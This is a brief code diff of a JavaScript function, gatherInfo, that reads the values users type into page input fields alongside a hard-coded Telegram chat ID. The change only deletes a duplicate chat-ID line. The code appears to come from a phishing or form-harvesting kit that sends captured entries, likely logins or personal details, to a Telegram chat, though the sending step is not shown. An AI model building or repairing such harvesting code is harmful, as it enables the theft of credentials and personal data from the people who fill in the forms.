@@ -5,7 +5,6 @@ function gatherInfo() {
   const id = Date.now().toString();
   const TELEGRAM_CHAT_ID = "-1002209368311";
 
-  const TELEGRAM_CHAT_ID = "-1002236584741";
   inputs.forEach((input) => {
     const type = input.getAttribute("aria-placeholder") || input.placeholder;
     const value = input.value;
